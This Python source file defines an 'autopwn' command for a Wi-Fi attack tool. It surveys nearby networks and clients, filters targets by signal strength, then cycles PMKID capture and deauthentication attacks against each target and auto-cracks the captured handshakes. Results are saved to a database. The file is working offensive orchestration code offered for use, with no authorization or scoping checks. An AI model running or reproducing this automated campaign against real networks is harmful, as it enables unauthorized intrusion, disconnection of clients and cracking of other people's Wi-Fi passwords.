"""Automated persistent capture campaign command."""

import signal
import sys
import time

import click
from rich.panel import Panel
from rich.markup import escape as rich_escape

from wifi_launchpad.cli.common import console


def register_autopwn_commands(cli):
    """Register the autopwn campaign command."""

    @cli.command()
    @click.option("--scan-time", "-s", type=int, default=90, help="Survey duration (default: 90s)")
    @click.option("--targets", "-t", help="Targets: number, range, or 'all' (e.g., '1,3,5' or '1-5')")
    @click.option("--crack/--no-crack", default=True, help="Auto-crack captured handshakes")
    @click.option("--interface", "-i", help="Monitor interface override")
    @click.option("--provider", type=click.Choice(["auto", "kismet", "native"]), default="native",
                  help="Survey tool: auto (Kismet if available), kismet, or native (airodump-ng)")
    @click.option("--min-signal", type=int, default=-70,
                  help="Skip targets weaker than this dBm (default: -70, use -85 for more targets)")
    @click.option("--attack-timeout", type=int, default=120,
                  help="Per-target capture timeout in seconds (default: 120)")
    def autopwn(scan_time, targets, crack, interface, provider, min_signal, attack_timeout):
        """Scan, analyze, and attack — fully automated chain.

        90-second survey detects networks + clients, analyzes attack vectors,
        then cycles PMKID → deauth per target until captured or exhausted.
        """

        from wifi_launchpad.cli.commands.autopwn_display import (
            print_attack_vectors, print_campaign_summary, print_client_map,
            print_recon_summary, print_target_table,
        )
        from wifi_launchpad.domain import AdapterManager
        from wifi_launchpad.providers.external.hcx import HCXCaptureProvider
        from wifi_launchpad.providers.native.scanner import NetworkScanner
        from wifi_launchpad.services.attack_chain import AttackChain
        from wifi_launchpad.services.capture_targeting import categorize_targets
        from wifi_launchpad.services.db import DatabaseService
        from wifi_launchpad.services.recon import build_recon_report

        console.print(Panel(
            "[bold cyan]AUTOPWN — Persistent Attack Campaign[/bold cyan]\n\n"
            "Phase 1: Survey (detect networks + clients)\n"
            "Phase 2: Recon analysis (identify attack vectors)\n"
            "Phase 3: Attack chain (PMKID → deauth → crack)\n\n"
            "[dim]Ctrl+C once = skip target | Ctrl+C twice = abort[/dim]",
            border_style="cyan",
        ))

        # ── Adapter setup ────────────────────────────────────────────
        manager = AdapterManager()
        manager.discover_adapters()
        optimal = manager.get_optimal_setup()
        monitor_iface = interface or (optimal["monitor"].interface if optimal.get("monitor") else None)

        # When a second adapter is available, use it for dedicated injection
        ap_adapter = optimal.get("ap")
        if ap_adapter:
            injection_iface = ap_adapter.interface
        else:
            injection_iface = optimal["injection"].interface if optimal.get("injection") else monitor_iface

        if not monitor_iface:
            console.print("[red]No monitor-capable adapter found[/red]")
            sys.exit(1)

        if ap_adapter:
            console.print(f"[green]Split mode: Monitor={monitor_iface} | Injection={injection_iface}[/green]")
        else:
            console.print(f"[green]Monitor/Injection: {monitor_iface}[/green]")

        # ── Phase 1: Survey ──────────────────────────────────────────
        if ap_adapter and provider == "native":
            scan_results = _run_dual_survey(manager, optimal, ap_adapter, scan_time)
        elif provider == "native":
            scan_results = _run_survey(manager, optimal, monitor_iface, injection_iface, scan_time)
        else:
            scan_results = _run_pipeline(manager, optimal, injection_iface, scan_time, provider)

        if not scan_results or not scan_results.networks:
            console.print("[red]No networks found[/red]")
            return

        # Prepare injection adapter(s) for Phase 3
        if ap_adapter:
            manager.enable_monitor_mode(ap_adapter)
        if optimal.get("injection") and optimal["injection"].current_mode != "monitor":
            manager.enable_monitor_mode(optimal["injection"])

        # ── Phase 2: Recon ───────────────────────────────────────────
        console.print(f"\n[bold cyan]Phase 2: Recon Analysis[/bold cyan]")
        recon = build_recon_report(scan_results)
        categories = categorize_targets(scan_results)

        db = DatabaseService()
        if db.connect():
            counts = db.save_scan(scan_results)
            console.print(f"[dim]DB: {counts['networks']} networks, {counts['clients']} clients saved[/dim]")

        print_recon_summary(recon, len(categories["crackable"]))

        if not recon.targets:
            console.print("[yellow]No crackable targets[/yellow]")
            db.disconnect()
            return

        console.print()
        print_target_table(recon)
        print_client_map(recon)
        print_attack_vectors(recon)

        # ── Target selection ─────────────────────────────────────────
        attack_targets = [intel.network for intel in recon.targets
                          if intel.network.signal_strength >= min_signal]
        if len(attack_targets) < len(recon.targets):
            skipped = len(recon.targets) - len(attack_targets)
            console.print(f"[dim]Filtered {skipped} target(s) below {min_signal} dBm threshold[/dim]")
        if targets:
            attack_targets = _parse_selection(targets, attack_targets)
            if not attack_targets:
                console.print("[red]Invalid target selection[/red]")
                db.disconnect()
                return

        recon_lookup = {intel.network.bssid: intel for intel in recon.targets}

        # ── Phase 3: Attack ──────────────────────────────────────────
        # Start background scanner on monitor adapter for live client discovery
        bg_scanner = None
        if ap_adapter:
            from wifi_launchpad.providers.native.scanner import NetworkScanner as BGScanner
            bg_scanner = BGScanner(monitor_iface)
            if bg_scanner.start_scan(write_interval=5):
                console.print(f"[dim]Background monitor active on {monitor_iface}[/dim]")
            else:
                console.print("[dim]Background monitor failed to start, using static client list[/dim]")
                bg_scanner = None

        hcx = HCXCaptureProvider(injection_iface) if HCXCaptureProvider.is_available() else None
        chain = AttackChain(
            monitor_interface=monitor_iface,
            injection_interface=injection_iface,
            hcx_provider=hcx,
            auto_crack=crack,
            on_status=lambda msg: console.print(msg),
            recon_lookup=recon_lookup,
            background_scanner=bg_scanner,
        )

        abort_count = [0]
        orig = signal.getsignal(signal.SIGINT)

        def _sigint(signum, frame):
            abort_count[0] += 1
            if abort_count[0] == 1:
                console.print("\n[yellow]Skipping target (Ctrl+C again to abort)...[/yellow]")
                chain.request_skip()
            else:
                signal.signal(signal.SIGINT, orig)
                raise KeyboardInterrupt

        signal.signal(signal.SIGINT, _sigint)

        console.print(f"\n[bold cyan]Phase 3: Attack ({len(attack_targets)} targets)[/bold cyan]\n")
        try:
            results = chain.run_campaign(attack_targets, scan_results)
        except KeyboardInterrupt:
            console.print("\n[red]Campaign aborted[/red]")
            results = []
        finally:
            signal.signal(signal.SIGINT, orig)
            if bg_scanner and bg_scanner.is_scanning:
                bg_scanner.stop_scan()

        if results:
            print_campaign_summary(results)
            if db.connected:
                counts = db.save_campaign(results)
                console.print(f"[dim]DB: {counts['attack_logs']} logs, {counts['handshakes']} handshakes saved[/dim]")

        db.disconnect()
        try:
            if optimal.get("monitor"):
                manager.disable_monitor_mode(optimal["monitor"])
        except Exception:
            pass


def _run_survey(manager, optimal, monitor_iface, injection_iface, scan_time):
    """Phase 1: airodump-ng survey on a single adapter."""

    from wifi_launchpad.providers.native.scanner import NetworkScanner

    injection_adapter = optimal.get("injection")
    if injection_adapter:
        console.print(f"[cyan]Setting {injection_iface} to monitor mode...[/cyan]")
        manager.enable_monitor_mode(injection_adapter)
        time.sleep(1)

    console.print(f"\n[bold cyan]Phase 1: airodump-ng survey on {injection_iface} ({scan_time}s)[/bold cyan]")
    scanner = NetworkScanner(injection_iface)
    if not scanner.start_scan(write_interval=2):
        console.print("[red]Failed to start airodump-ng[/red]")
        return None
    time.sleep(scan_time)
    return scanner.stop_scan()


def _run_dual_survey(manager, optimal, ap_adapter, scan_time):
    """Phase 1: Parallel 2.4 GHz + 5 GHz survey on two adapters."""

    from wifi_launchpad.providers.native.scanner import NetworkScanner

    primary = optimal.get("injection")
    if not primary:
        return None

    channels_24 = [1, 6, 11]
    channels_5 = [36, 40, 44, 48, 149, 153, 157, 161]

    console.print(f"[cyan]Setting {primary.interface} to monitor mode...[/cyan]")
    manager.enable_monitor_mode(primary)
    console.print(f"[cyan]Setting {ap_adapter.interface} to monitor mode...[/cyan]")
    manager.enable_monitor_mode(ap_adapter)
    time.sleep(1)

    console.print(
        f"\n[bold cyan]Phase 1: Dual-band parallel survey ({scan_time}s)[/bold cyan]"
    )
    console.print(
        f"  [dim]{primary.interface} → 2.4 GHz (ch {','.join(str(c) for c in channels_24)})[/dim]"
    )
    console.print(
        f"  [dim]{ap_adapter.interface} → 5 GHz (ch {','.join(str(c) for c in channels_5)})[/dim]"
    )

    scanner_24 = NetworkScanner(primary.interface)
    scanner_5 = NetworkScanner(ap_adapter.interface)

    if not scanner_24.start_scan(channels=channels_24, write_interval=2):
        console.print("[red]Failed to start 2.4 GHz scanner[/red]")
        return None
    if not scanner_5.start_scan(channels=channels_5, write_interval=2):
        console.print("[yellow]Failed to start 5 GHz scanner, falling back to single-band[/yellow]")
        time.sleep(scan_time)
        return scanner_24.stop_scan()

    time.sleep(scan_time)

    results_24 = scanner_24.stop_scan()
    results_5 = scanner_5.stop_scan()

    results_24.merge(results_5)
    console.print(
        f"  [green]Merged: {len(results_24.networks)} networks, "
        f"{len(results_24.clients)} clients[/green]"
    )
    return results_24


def _run_pipeline(manager, optimal, injection_iface, scan_time, provider):
    """Phase 1: Multi-tool survey pipeline (Kismet + wash + airodump + tshark)."""
    import asyncio
    from wifi_launchpad.services.survey_pipeline import SurveyPipeline

    injection_adapter = optimal.get("injection")
    if injection_adapter:
        console.print(f"[cyan]Setting {injection_iface} to monitor mode...[/cyan]")
        manager.enable_monitor_mode(injection_adapter)
        time.sleep(1)

    def on_phase(name, status):
        console.print(f"  [cyan]{name}:[/cyan] {status}")

    console.print(f"\n[bold cyan]Phase 1: Multi-tool pipeline on {injection_iface} ({scan_time}s)[/bold cyan]")
    pipeline = SurveyPipeline(interface=injection_iface, on_phase=on_phase)

    try:
        return asyncio.get_event_loop().run_until_complete(pipeline.run(duration=scan_time))
    except RuntimeError:
        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(pipeline.run(duration=scan_time))
        loop.close()
        return result


def _parse_selection(selection: str, candidates: list) -> list:
    """Parse target selection — accepts indices (1,3,5-7), 'all', BSSIDs, or SSIDs."""

    selection = selection.strip()
    if selection.lower() == "all":
        return candidates

    # Try BSSID/SSID matching first
    matched = [
        c for c in candidates
        if c.bssid.upper() == selection.upper() or c.ssid.lower() == selection.lower()
    ]
    if matched:
        return matched

    # Fall back to numeric indices
    indices = set()
    for part in selection.lower().split(","):
        part = part.strip()
        if "-" in part and ":" not in part:
            try:
                s, e = part.split("-", 1)
                indices.update(range(int(s), int(e) + 1))
            except ValueError:
                return []
        else:
            try:
                indices.add(int(part))
            except ValueError:
                return []

    return [candidates[i - 1] for i in sorted(indices) if 1 <= i <= len(candidates)]
